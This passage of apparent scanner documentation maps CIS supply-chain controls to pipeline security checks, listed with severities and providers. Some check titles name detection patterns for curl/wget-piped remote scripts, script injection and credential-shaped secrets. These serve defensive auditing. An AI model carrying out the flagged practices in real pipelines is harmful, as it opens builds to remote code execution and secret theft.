# CIS Software Supply Chain Security Guide

- **Version:** 1.0
- **URL:** <https://www.cisecurity.org/benchmark/software_supply_chain_security>
- **Source of truth:** `pipeline_check/core/standards/data/cis_supply_chain.py`

CIS Software Supply Chain Security Guide. Source, build, dependency,
and artifact controls covering the full pipeline trust chain.

## At a glance

- **Controls in this standard:** 25
- **Controls evidenced by at least one check:** 25 / 25
- **Distinct checks evidencing this standard:** 197
- **Of those, autofixable with `--fix`:** 43

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`1.1.5`](#ctrl-1-1-5) | Ensure any change to code requires the review of additional strong authenticators | 9 | 2H · 6M · 1L |
| [`1.1.6`](#ctrl-1-1-6) | Ensure any change to code is signed | 1 | 1M |
| [`1.1.7`](#ctrl-1-1-7) | Ensure any change to code is automatically scanned for risks (SAST) | 2 | 2M |
| [`1.1.8`](#ctrl-1-1-8) | Ensure scanners are in place to identify and confirm presence of vulnerabilities (SCA) | 1 | 1M |
| [`1.1.17`](#ctrl-1-1-17) | Ensure default branches' commits are protected from being deleted/rewritten | 4 | 3H · 1L |
| [`1.3.4`](#ctrl-1-3-4) | Ensure organization identity is required for contribution (no long-lived personal tokens) | 6 | 4H · 2M |
| [`1.4.1`](#ctrl-1-4-1) | Ensure third-party artifacts and open-source libraries are verified | 36 | 2C · 21H · 9M · 4L |
| [`1.5.1`](#ctrl-1-5-1) | Ensure scanners are in place to identify and prevent sensitive data in code | 2 | 2H |
| [`2.1.3`](#ctrl-2-1-3) | Ensure the build environment is hardened | 32 | 8C · 16H · 7M · 1L |
| [`2.1.6`](#ctrl-2-1-6) | Ensure build workers have minimal network connectivity | 8 | 1C · 3H · 4M |
| [`2.2.2`](#ctrl-2-2-2) | Ensure build workers are single-use | 7 | 3M · 4L |
| [`2.3.4`](#ctrl-2-3-4) | Ensure pipelines are scanned for secrets and sensitive data | 14 | 9C · 3H · 1M · 1L |
| [`2.3.7`](#ctrl-2-3-7) | Ensure pipeline steps produce audit logs | 5 | 1H · 2M · 2L |
| [`2.3.8`](#ctrl-2-3-8) | Ensure pipeline configuration files are reviewed before execution | 16 | 3C · 6H · 4M · 3L |
| [`2.4.2`](#ctrl-2-4-2) | Ensure pipeline integrity, artifacts are signed by the pipeline | 4 | 4M |
| [`2.4.3`](#ctrl-2-4-3) | Ensure access to the pipeline execution environment is restricted | 17 | 6C · 3H · 8M |
| [`3.1.3`](#ctrl-3-1-3) | Ensure signed metadata of dependencies is verified | 25 | 1C · 10H · 14M |
| [`3.1.5`](#ctrl-3-1-5) | Ensure only trusted package managers and repositories are used | 20 | 18H · 1M · 1L |
| [`4.1.1`](#ctrl-4-1-1) | Ensure all artifacts on all releases are verified (signed, integrity-checked) | 17 | 3H · 14M |
| [`4.2.1`](#ctrl-4-2-1) | Ensure access to artifacts is limited | 4 | 2C · 1H · 1M |
| [`4.3.3`](#ctrl-4-3-3) | Ensure package registries use authentication and authorisation | 1 | 1C |
| [`4.4.1`](#ctrl-4-4-1) | Ensure artifacts have provenance/SBOM metadata | 19 | 1H · 13M · 5L |
| [`5.1.4`](#ctrl-5-1-4) | Ensure deployment configuration manifests are reviewed before apply | 8 | 2H · 6M |
| [`5.2.1`](#ctrl-5-2-1) | Ensure deployment environments are separated | 4 | 1H · 3M |
| [`5.2.3`](#ctrl-5-2-3) | Ensure deployment environment activity is audited | 2 | 1M · 1L |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard cis_supply_chain`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard cis_supply_chain

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard cis_supply_chain

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard cis_supply_chain --standard owasp_cicd_top_10
```

## Controls in scope

### 1.1.5: Ensure any change to code requires the review of additional strong authenticators { #ctrl-1-1-5 }

**Evidenced by 9 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-012`](#detail-scm-012) | Default branch protection keeps stale reviews after a push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-013`](#detail-scm-013) | Default branch protection does not require conversation resolution | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.6: Ensure any change to code is signed { #ctrl-1-1-6 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.7: Ensure any change to code is automatically scanned for risks (SAST) { #ctrl-1-1-7 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.8: Ensure scanners are in place to identify and confirm presence of vulnerabilities (SCA) { #ctrl-1-1-8 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.17: Ensure default branches' commits are protected from being deleted/rewritten { #ctrl-1-1-17 }

**Evidenced by 4 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-007`](#detail-scm-007) | Default branch protection allows force-pushes | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-009`](#detail-scm-009) | Default branch protection allows branch deletion | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-019`](#detail-scm-019) | Push restrictions allowlist names individual users | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.3.4: Ensure organization identity is required for contribution (no long-lived personal tokens) { #ctrl-1-3-4 }

**Evidenced by 6 checks** across 3 providers (AWS, CircleCI, GitHub Actions).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-006`](#detail-cb-006) | CodeBuild source auth uses long-lived token | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-005`](#detail-cc-005) | AWS auth uses long-lived access keys in environment block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-019`](#detail-cc-019) | `add_ssh_keys` without fingerprint restriction | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-004`](#detail-cp-004) | Legacy ThirdParty/GitHub source action (OAuth token) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |

### 1.4.1: Ensure third-party artifacts and open-source libraries are verified { #ctrl-1-4-1 }

**Evidenced by 36 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-016`](#detail-cc-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-011`](#detail-df-011) | Package manager install without cache cleanup in same layer | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-012`](#detail-gcb-012) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-025`](#detail-gcb-025) | Build has no tags for audit / discoverability | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`HELM-008`](#detail-helm-008) | Chart.lock generated more than 90 days ago | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`SCM-016`](#detail-scm-016) | Private vulnerability reporting is not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### 1.5.1: Ensure scanners are in place to identify and prevent sensitive data in code { #ctrl-1-5-1 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 2.1.3: Ensure the build environment is hardened { #ctrl-2-1-3 }

**Evidenced by 32 checks** across 11 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-002`](#detail-ado-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-002`](#detail-argo-002) | Argo template container runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-004`](#detail-argo-004) | Argo workflow mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-005`](#detail-argo-005) | Argo input parameter interpolated unsafely in script / args | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-003`](#detail-bk-003) | Untrusted Buildkite variable interpolated in command | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-005`](#detail-bk-005) | Container started with --privileged or host-bind escalation | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CB-002`](#detail-cb-002) | Privileged mode enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-002`](#detail-cc-002) | Script injection via untrusted environment variable | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-012`](#detail-cc-012) | Dynamic config via `setup: true` enables code injection | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-017`](#detail-cc-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-002`](#detail-df-002) | Container runs as root (missing or root USER directive) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-005`](#detail-df-005) | RUN uses shell-eval (eval / sh -c on a variable / backticks) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-008`](#detail-df-008) | RUN invokes docker --privileged or escalates capabilities | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-012`](#detail-df-012) | RUN invokes sudo | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-013`](#detail-df-013) | EXPOSE declares sensitive remote-access port | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-014`](#detail-df-014) | WORKDIR set to a system / kernel filesystem path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-015`](#detail-df-015) | RUN grants world-writable permissions (chmod 777 / a+w) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-017`](#detail-df-017) | ENV PATH prepends a world-writable directory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-018`](#detail-df-018) | RUN chown rewrites ownership of a system path | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-004`](#detail-ecr-004) | No lifecycle policy configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`GCB-002`](#detail-gcb-002) | Cloud Build uses the default service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-016`](#detail-gcb-016) | Step dir field contains parent-directory escape (..) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-019`](#detail-gcb-019) | Shell entrypoint inlines a user substitution into args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-003`](#detail-gha-003) | Script injection via untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`TKN-002`](#detail-tkn-002) | Tekton step runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-003`](#detail-tkn-003) | Tekton param interpolated unsafely in step script | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-004`](#detail-tkn-004) | Tekton Task mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |

### 2.1.6: Ensure build workers have minimal network connectivity { #ctrl-2-1-6 }

**Evidenced by 8 checks** across 4 providers (AWS, CircleCI, Cloud Build, Dockerfile).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-002`](#detail-cb-002) | Privileged mode enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-014`](#detail-cc-014) | Job missing `resource_class` declaration | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-013`](#detail-df-013) | EXPOSE declares sensitive remote-access port | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-010`](#detail-gcb-010) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-013`](#detail-gcb-013) | Package install bypasses registry integrity (git / path / tarball) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-021`](#detail-gcb-021) | No private worker pool, build runs on the shared default pool | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`PBAC-001`](#detail-pbac-001) | CodeBuild project has no VPC configuration | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |

### 2.2.2: Ensure build workers are single-use { #ctrl-2-2-2 }

**Evidenced by 7 checks** across 6 providers (AWS, Argo Workflows, Bitbucket, Buildkite, CircleCI, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ARGO-007`](#detail-argo-007) | Argo workflow has no activeDeadlineSeconds | <span class="pg-sev pg-sev--low">LOW</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-005`](#detail-bb-005) | Step has no `max-time`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-006`](#detail-bk-006) | Step has no timeout_in_minutes | <span class="pg-sev pg-sev--low">LOW</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-004`](#detail-cb-004) | No build timeout configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CC-015`](#detail-cc-015) | No `no_output_timeout` configured | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-006`](#detail-tkn-006) | Tekton run lacks an explicit timeout | <span class="pg-sev pg-sev--low">LOW</span> | [Tekton](../providers/tekton.md) |  |

### 2.3.4: Ensure pipelines are scanned for secrets and sensitive data { #ctrl-2-3-4 }

**Evidenced by 14 checks** across 10 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitLab CI, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-003`](#detail-ado-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-006`](#detail-argo-006) | Literal secret value in Argo template env or parameter default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-003`](#detail-bb-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-002`](#detail-bk-002) | Literal secret value in pipeline env block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CB-001`](#detail-cb-001) | Secrets in plaintext environment variables | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-004`](#detail-cc-004) | Secret-like environment variable not managed via context | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-008`](#detail-cc-008) | Credential-shaped literal in config body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-003`](#detail-gcb-003) | Secret Manager value referenced in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-005`](#detail-gcb-005) | Build timeout unset or excessive | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### 2.3.7: Ensure pipeline steps produce audit logs { #ctrl-2-3-7 }

**Evidenced by 5 checks** across 3 providers (AWS, CircleCI, Cloud Build).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
